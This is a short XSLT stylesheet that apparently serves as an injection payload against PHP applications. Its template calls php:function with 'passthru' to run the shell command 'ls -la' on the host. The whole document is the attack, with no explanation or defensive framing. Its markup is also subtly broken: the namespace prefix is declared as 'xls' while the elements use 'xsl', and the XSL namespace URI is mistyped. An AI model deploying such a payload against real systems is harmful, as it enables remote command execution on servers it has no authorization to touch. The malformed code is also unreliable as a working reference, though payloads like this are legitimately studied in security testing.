<xsl:stylesheet version="1.0" xmlns:xls="http://www.w3.org/199/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('passthru','ls -la')" />
</xsl:template>
</xsl:stylesheet>
